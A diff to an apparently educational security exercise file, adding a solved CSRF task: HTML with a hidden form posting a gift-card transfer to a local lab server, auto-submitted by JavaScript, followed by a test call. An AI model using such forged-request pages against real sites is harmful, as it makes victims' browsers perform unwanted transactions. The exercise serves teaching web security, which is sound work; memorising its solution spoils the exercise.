@@ -76,4 +76,38 @@ from w2d4_test import test_exploit_xss_vulnerability
 if __name__ == "__main__":
     test_exploit_xss_vulnerability(exploit_xss_vulnerability)
 
+
 # %%
+def exploit_csrf_vulnerability():
+    """
+    Create malicious HTML that exploits CSRF vulnerability.
+
+    Args:
+        None
+
+    Returns:
+        str: HTML content that performs the CSRF attack
+    """
+    # TODO: Create malicious HTML that performs CSRF attack
+    # - Create an HTML page that appears legitimate
+    # - Include a hidden form targeting the gift card endpoint
+    # - Add JavaScript to automatically submit the form
+    exploit = """
+    <form id="evil" action="http://localhost:8000/gift/0" method="POST">
+    <input type="text" name="amount" value="666">
+    <input type="text" name="username" value="test2">
+    </form>
+    <script>
+    document.querySelector("#evil").submit()
+    </script>
+    """
+    bad_website = f"<html><body><h1>CSRF Vulnerability</h1>{exploit}</body></html>"
+    # - Give user "test2" a gify card
+    return bad_website
+
+
+from w2d4_test import test_exploit_csrf_vulnerability
+
+if __name__ == "__main__":
+    print("\nTesting CSRF vulnerability exploitation...")
+    test_exploit_csrf_vulnerability(exploit_csrf_vulnerability)
